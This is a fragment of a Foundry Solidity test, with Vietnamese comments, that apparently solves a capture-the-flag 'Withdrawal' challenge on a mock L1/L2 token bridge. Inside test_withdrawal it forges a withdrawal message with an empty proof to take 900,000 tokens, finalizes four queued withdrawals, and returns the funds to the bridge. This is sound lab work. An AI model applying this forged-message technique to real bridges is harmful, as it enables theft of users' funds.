...
contract WithdrawalChallenge is Test {
    ...
    uint256 constant amountRescue = 900_000e18;
    // address l2Sender = makeAddr("l2Sender");
    address l2Sender = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16; // File json
    address target = 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5; // FIle json
    function test_withdrawal() public checkSolvedByPlayer {
        // Tao message withdraw
        bytes memory messWidth = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (player, amountRescue));
        // Tao thong diep rut token fake
        bytes memory mess = abi.encodeCall(L1Forwarder.forwardMessage, (0, address(0), address(l1TokenBridge), messWidth));

        // Hoan thanh viec rut tien
        l1Gateway.finalizeWithdrawal(0, l2Handler, address(l1Forwarder), block.timestamp - 7 days, mess, new bytes32[](0));

        // Them ngay de rut tien
        vm.warp(START_TIMESTAMP + 8 days);

        // Rut tien cho 4 giao dich kia theo de bai
        //      Giao dich 1
        l1Gateway.finalizeWithdrawal(0, l2Sender, target, START_TIMESTAMP, 
        ...
        new bytes32[](0));
        //      Giao dich 2
        l1Gateway.finalizeWithdrawal(1, l2Sender, target, START_TIMESTAMP + 50, 
        ...
        new bytes32[](0));
        //      Giao dich 3
        l1Gateway.finalizeWithdrawal(2, l2Sender, target, START_TIMESTAMP + 50 + 85, 
        ...
        new bytes32[](0));
        //      Giao dich 4
        l1Gateway.finalizeWithdrawal(3, l2Sender, target, START_TIMESTAMP + 50 + 85 + 77, 
        ...
        // Chuyen tien tro lai L1
        token.transfer(address(l1TokenBridge), amountRescue);
    }
